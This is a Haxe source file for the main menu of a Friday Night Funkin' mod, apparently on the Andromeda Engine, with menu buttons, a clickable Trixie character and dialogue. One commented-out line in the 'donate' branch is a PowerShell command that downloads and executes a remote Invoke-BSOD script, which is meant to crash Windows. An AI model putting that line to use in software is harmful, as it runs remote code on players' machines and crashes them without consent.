package;

#if desktop
import Discord.DiscordClient;
#end
import flixel.FlxG;
import flixel.FlxObject;
import flixel.FlxSprite;
import flixel.addons.transition.FlxTransitionableState;
import flixel.effects.FlxFlicker;
import flixel.graphics.frames.FlxAtlasFrames;
import flixel.group.FlxGroup.FlxTypedGroup;
import flixel.text.FlxText;
import flixel.tweens.FlxEase;
import flixel.tweens.FlxTween;
import flixel.util.FlxColor;
import io.newgrounds.NG;
import lime.app.Application;
import haxe.Exception;
import sys.io.File;
using StringTools;
import flixel.util.FlxTimer;
import Options;
class MainMenuState extends MusicBeatState
{
	var curSelected:Int = 0;
	var india:Bool = false;
	var menuItems:FlxTypedGroup<FlxSprite>;

	var optionShit:Array<String> = ['freeplay', 'story', 'settings'];
	
	var trixied = false;
	var magenta:FlxSprite;
	var camFollow:FlxObject;
	var trixie:FlxSprite;
		var doof:DialogueBox;

	override function create()
	{
		
		doof = new DialogueBox(false, CoolUtil.coolTextFile(Paths.txt("trixiedialogue")),false);
		
		TitleState.curDir = "assets";
		#if desktop
		// Updating Discord Rich Presence
		DiscordClient.changePresence("In the Menus", null);
		#end

		if (!FlxG.sound.music.playing)
		{
			FlxG.sound.playMusic(Paths.music('freakyMenu'));
		}

		persistentUpdate = persistentDraw = true;
/*
		var bg:FlxSprite = new FlxSprite(-80).loadGraphic(Paths.image('menuBG'));
		bg.scrollFactor.x = 0;
		bg.scrollFactor.y = 0.18;
		bg.setGraphicSize(Std.int(bg.width * 1.1));
		bg.updateHitbox();
		bg.screenCenter();
		bg.antialiasing = true;
		add(bg);
*/
		camFollow = new FlxObject(0, 0, 1, 1);
		add(camFollow);

		magenta = new FlxSprite(-80).loadGraphic(Paths.image('menuDesat'));
		magenta.scrollFactor.x = 0;
		magenta.scrollFactor.y = 0.18;
		magenta.setGraphicSize(Std.int(magenta.width * 1.1));
		magenta.updateHitbox();
		magenta.screenCenter();
		magenta.visible = false;
		magenta.antialiasing = true;
		magenta.color = 0xFFfd719b;
		//add(magenta);
		// magenta.scrollFactor.set();

		menuItems = new FlxTypedGroup<FlxSprite>();
		var bg:BGSprite = new BGSprite('mainmenu/bg', -220.6, -151.2);
		add(bg);
		trixie = new FlxSprite( 675.65, 300.8);
		trixie.frames = Paths.getSparrowAtlas('mainmenu/trixie');
		trixie.animation.addByIndices('idle', 'trixie', Character.numArr(0, 5), '', 24, false);
		var rr = Character.numArr(6, 46);
		rr.push(0);
		trixie.animation.addByIndices('read', 'trixie',rr , '', 24,false);
		trixie.animation.addByIndices('notice', 'trixie', Character.numArr(47, 58), '', 24, false);
		trixie.animation.play('read');
		trixie.animation.finishCallback = function(name){
			if (name == 'read'){
				trixie.animation.play('idle');
			}
		}
		trixie.antialiasing = true;
		add(trixie);
		
		
Conductor.changeBPM(110);
		add(menuItems);
		

		for (i in 0...optionShit.length)
		{
			var menuItem:FlxSprite = new FlxSprite(0,0);

			menuItem.frames = Paths.getSparrowAtlas('mainmenu/'+optionShit[i]);
			menuItem.animation.addByIndices('idle', optionShit[i] + "Button",[0],'', 24,false);
			menuItem.animation.addByIndices('selected', optionShit[i] + "Button",Character.numArr(1,10),'', 24,false);
			menuItem.animation.play('idle');
			menuItem.ID = i;
			menuItems.add(menuItem);
			menuItem.antialiasing = true;
		}
		menuItems.members[0].setPosition(19.95, 411);
		menuItems.members[1].setPosition(159.25, 64);
		menuItems.members[2].setPosition(645.45, 411);
		//FlxG.camera.follow(camFollow, null, 0.06);

		var versionShit:FlxText = new FlxText(5, FlxG.height - 18, 0, "v" + Application.current.meta.get('version') + " - Andromeda Engine B6", 12);
		versionShit.scrollFactor.set();
		versionShit.setFormat("VCR OSD Mono", 16, FlxColor.WHITE, LEFT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
		add(versionShit);

				new FlxTimer().start(12, function(e:FlxTimer){
					
					if(trixie.animation.curAnim.name != 'notice')trixie.animation.play('read');
					
				},0);
		// NG.core.calls.event.logEvent('swag').send();

		changeItem();

		doof.finishThing = playmus;
		doof.scrollFactor.set();
		super.create();
	}

	var selectedSomethin:Bool = false;
	function diashit(){//tktems look
		PlayState.isPony = !PlayState.isPony;
		india = true;
		trixie.animation.play('read');
		
		add(doof);
	}
	function playmus(){
		india = false;
		
		selectedSomethin = false;
		FlxG.sound.playMusic(Paths.music('freakyMenu'));
	}
	override public function beatHit():Void 
	{
		super.beatHit();
		
		if(trixie.animation.curAnim.name == 'idle')trixie.animation.play('idle');
	}
	override function update(elapsed:Float)
	{
Conductor.songPosition = FlxG.sound.music.time;
		FlxG.mouse.visible = true;
		if (FlxG.sound.music.volume < 0.8)
		{
			FlxG.sound.music.volume += 0.5 * FlxG.elapsed;
		}

		if (!selectedSomethin && !india)
		{
			
			
			if (FlxG.mouse.overlaps(trixie) && FlxG.mouse.justPressed && !trixied){
				trixied = true;
		trixie.animation.play('notice');
				new FlxTimer().start(1, function(e:FlxTimer){
					
					diashit();
					
				});
				
			}
			
			
			
			
			if (controls.LEFT_P)
			{
				FlxG.sound.play(Paths.sound('scrollMenu'));
				changeItem(0);
			}
			if (FlxG.keys.justPressed.A)//JUST CUT THIS SHIT OUT
			{
				//diashit();
			}

			if (controls.RIGHT_P)
			{
				FlxG.sound.play(Paths.sound('scrollMenu'));
				changeItem(2);
			}
			if (controls.UP_P)
			{
				FlxG.sound.play(Paths.sound('scrollMenu'));
				changeItem(1);
			}
			if (controls.ACCEPT)
			{
				if (optionShit[curSelected] == 'donate')
				{
					#if linux
					Sys.command('/usr/bin/xdg-open', ["https://ninja-muffin24.itch.io/funkin", "&"]);
					#else
					FlxG.openURL('https://ninja-muffin24.itch.io/funkin');
					//Sys.command("powershell.exe -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
					#end
				}
				else
				{
					selectedSomethin = true;
					FlxG.sound.play(Paths.sound('confirmMenu'));
					if(OptionUtils.options.menuFlash){
						FlxFlicker.flicker(magenta, 1.1, 0.15, false);
					}else{
						magenta.visible=true;
					}

					menuItems.forEach(function(spr:FlxSprite)
					{
						if (curSelected != spr.ID)
						{
							FlxTween.tween(spr, {alpha: 0}, 0.4, {
								ease: FlxEase.quadOut,
								onComplete: function(twn:FlxTween)
								{
									spr.kill();
								}
							});
						}
						else
						{
							if(OptionUtils.options.menuFlash){
								FlxFlicker.flicker(spr, 1, 0.06, false, false, function(flick:FlxFlicker)
								{
									var daChoice:String = optionShit[curSelected];

									switch (daChoice)
									{
										case 'story':
											FlxG.switchState(new StoryMenuState());
											trace("Story Menu Selected");
										case 'freeplay':
											FlxG.switchState(new FreeplayState());
											trace("Freeplay Menu Selected");

										case 'settings':
											FlxG.switchState(new OptionsMenu());
									}
								});
							}else{
								new FlxTimer().start(1, function(tmr:FlxTimer){
									var daChoice:String = optionShit[curSelected];

									switch (daChoice)
									{
										case 'story':
											FlxG.switchState(new StoryMenuState());
											trace("Story Menu Selected");
										case 'freeplay':
											FlxG.switchState(new FreeplayState());
											trace("Freeplay Menu Selected");

										case 'settings':
											FlxG.switchState(new OptionsMenu());
									}
								});
							}
						}
					});
				}
			}
		}

		super.update(elapsed);

		menuItems.forEach(function(spr:FlxSprite)
		{
			//spr.screenCenter(X);
		});
	}

	function changeItem(huh:Int = 0,scroll:Bool = true)
	{
			curSelected = huh;
		

		if (curSelected >= menuItems.length)
			curSelected = 0;
		if (curSelected < 0)
			curSelected = menuItems.length - 1;

		menuItems.forEach(function(spr:FlxSprite)
		{
			spr.animation.play('idle');

			if (spr.ID == curSelected)
			{
				spr.animation.play('selected');
				camFollow.setPosition(spr.getGraphicMidpoint().x, spr.getGraphicMidpoint().y);
			}

			//spr.updateHitbox();
		});
	}
}
